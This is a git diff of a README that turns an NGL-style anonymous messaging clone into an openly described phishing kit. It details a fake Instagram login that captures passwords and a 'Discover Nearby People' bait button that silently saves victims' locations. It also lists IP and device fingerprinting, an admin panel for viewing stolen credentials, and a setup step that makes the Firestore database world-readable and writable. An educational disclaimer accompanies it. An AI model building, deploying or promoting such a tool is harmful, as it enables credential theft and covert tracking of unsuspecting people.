@@ -1,69 +1,124 @@
-# NGL Professional Audit & Anonymous Q&A Platform
+# 🕵️‍♂️ ngl-core-audit - Advanced Phishing Simulation & Audit Tool
 
-![NGL Banner](https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?q=80&w=1000&auto=format&fit=crop)
+> **DISCLAIMER:** This project is created strictly for **educational purposes** and **authorized security auditing** only. The developer assumes no responsibility for misuse. Use responsibly to test your own security awareness or that of consenting parties.
 
-A sophisticated full-stack anonymous messaging platform inspired by NGL.designed for security auditing and private data collection. Built with a React/Vite frontend and a Node.js/Express backend, this project features a professional admin dashboard, data persistence, and advanced IP tracking.
+**ngl-core-audit** is a high-fidelity clone of the popular anonymous messaging app NGL, engineered to demonstrate social engineering vectors, data capture techniques, and geolocation tracking strategies. It features a robust Admin Panel for real-time configuration and data analysis.
 
-## ✨ Features
+---
 
-### 📨 For Users
+## 🚀 Key Features
 
-- **Anonymous Messaging**: Seamless message submission interface with random prompts (dice feature).
-- **Instagram Verification**: Conditional Instagram username prompt to build trust/collect data.
-- **Modern UI**: Vibrant gradients and smooth micro-animations using Framer Motion.
-- **Privacy First**: Clear privacy notes and security guarantees for users.
+### 1. 🎣 Phishing Simulation Modes
 
-### 🔐 For Admins (Secure Dashboard)
+Configure the attack vector directly from the Admin Panel:
 
-- **Cloud Inbox**: Real-time messages with IP tracking and timestamps, stored securely in Firebase Firestore.
-- **Firebase Authentication**: Secure login using Email & Password. Self-registration is disabled for maximum security.
-- **Advanced Persistence**: Cloud-based storage ensures your data is never lost during Vercel redeployments.
+- **Username Only Mode (`username`)**: Simulates a standard NGL flow asking only for the Instagram username. Low friction.
+- **Fake Login Mode (`ig_login`)**: Presents a pixel-perfect clone of the Instagram Login screen. Captures tracking credentials (username + password). High value.
+- **Direct Mode (`none`)**: Allows sending messages without any prompts. Used to build trust before switching modes.
 
-### 🛡️ Security
+### 2. 📍 Advanced Geolocation Tracking
 
-- **Firebase Admin SDK**: Server-side token verification for all administrative actions.
-- **Role-Based Security**: Access is restricted to users manually added via the Firebase Console.
-- **Express Rate Limit**: Prevents spam on the messaging endpoint.
+Two distinct strategies to capture target location coordinates (Latitude/Longitude), fully configurable via Admin:
+
+- **Strategy A: Integrated (Silent)**
+  - Requests location permission automatically when the Fake Login page loads.
+  - Best for "Login Mode" where users might expect security checks.
+
+- **Strategy B: "Nearby Discovery" (Social Engineering)**
+  - Adds a tempting **"📍 Discover Nearby People (BETA)"** button to the footer of every screen (Message, Gate, Prompt).
+  - **The Hook:** Clicking the button triggers the browser's location permission prompt.
+  - **Immediate Capture:** As soon as permission is granted, the location is **instantly saved** to Firebase (even if the user acts no further).
+  - **The Bait:** After capture, users are shown an alert ("3 Active Users Found nearby!") and redirected to the Login page to "message them".
+
+### 3. 🛡️ Comprehensive Admin Panel
+
+A powerful dashboard to monitor and control the simulation:
+
+- **📥 Inbox**: View all anonymous messages sent by targets. Includes IP address and timestamp.
+- **🔑 Credentials**: View captured Instagram credentials (Username/Password). Includes password visibility toggle and IP tracking.
+- **🌍 Location History**: A unified timeline feed of all captured location data.
+  - **Color Coded**: Distinguishes between locations captured via *Messages* (Blue) vs. *Logins* (Red).
+  - **Smart Context**: Shows the associated message content or username tracking the location.
+  - **Maps Integration**: One-click deep link to open coordinates in Google Maps.
+- **🎨 Media Library**: Generate "Instagram Story" style images from received messages using the built-in canvas generator.
+- **⚙️ Settings**: Real-time toggles for Capture Modes and Location Strategies.
+
+### 4. 🕵️ Data Capture Intelligence
+
+The system silently captures:
+
+- **IP Address:** Tracking via `ipify` API on every interaction.
+- **User Agent:** Device and browser fingerprinting.
+- **Timestamps:** Precise event logging.
+- **Partial Data:** "Immediate Save" architecture ensures data (like location) is stored the moment it is available, preventing data loss if the user abandons the flow.
+
+---
 
 ## 🛠️ Tech Stack
 
-- **Frontend**: React 19, Vite, Framer Motion, Firebase Client SDK
-- **Backend**: Node.js, Express, Firebase Admin SDK (Serverless on Vercel)
-- **Storage**: Firebase Firestore (NoSQL)
-
-## 📦 Installation & Deployment
-
-1. **Clone & Install:**
-
-   ```bash
-   git clone https://github.com/yourusername/ngl-core-audit.git
-   npm install
-   ```
-
-2. **Configure Firebase:**
-   Follow the [Firebase Setup Guide](./FirebaseSetup.md) to create your project and get credentials.
-
-3. **Set Environment Variables:**
-   Create a `.env` file based on `.env.example` and fill in your Firebase keys.
-
-4. **Deploy to Vercel:**
-   Push your code to GitHub and connect it to Vercel. Don't forget to add your `.env` variables to the Vercel Dashboard.
-
-## 📂 Project Structure
-
-```text
-├── api/              # Vercel Serverless Functions (Backend)
-├── src/
-│   ├── pages/        # Send, Login, Admin Panel
-│   ├── components/   # UI components
-│   └── lib/          # Firebase client config
-├── vite.config.js    # Proxy and build configuration
-└── vercel.json       # Deployment configuration
-```
-
-## 📜 License
-
-MIT License. For educational and security auditing purposes only.
+- **Frontend:** React 18, Vite, Framer Motion (for smooth, realistic animations).
+- **Backend:** Firebase (Firestore NoSQL Database).
+- **Styling:** CSS3, Lucide React Icons.
+- **Deployment:** Vercel / Netlify compatible.
 
 ---
-Built with ⚡ by BugraAkdemir Developer
+
+## 📦 Installation & Setup
+
+1. **Clone the Repository**
+
+    ```bash
+    git clone https://github.com/BugraAkdemir/ngl-core-audit.git
+    cd ngl-core-audit
+    ```
+
+2. **Install Dependencies**
+
+    ```bash
+    npm install
+    ```
+
+3. **Firebase Configuration**
+    - Create a project at [Firebase Console](https://console.firebase.google.com/).
+    - Enable **Firestore Database**.
+    - Set rules to allow read/write (for simulation/testing):
+
+        ```javascript
+        allow read, write: if true;
+        ```
+
+    - Create a `.env` file based on `.env.example` and populate with your Firebase config keys.
+
+4. **Run Locally**
+
+    ```bash
+    npm run dev
+    ```
+
+5. **Build for Production**
+
+    ```bash
+    npm run build
+    ```
+
+---
+
+## 📸 Snapshots
+
+- **Fake Login:** Pixel-perfect replication of Instagram's UI to maximize trust.
+- **Nearby Button:** Strategically placed "BETA" feature to incentivize location sharing.
+- **Admin Dashboard:** clean, dark-mode inspired interface for data visualization.
+
+---
+
+## ⚠️ Legal & Ethical Warning
+
+This software is for **Educational Use Only**.
+
+- **DO NOT** use this against targets without their explicit, prior consent.
+- **DO NOT** use this for malicious credential harvesting.
+- The developer is not responsible for any damage caused by this tool.
+
+---
+
+*Project by [BugraPC]*
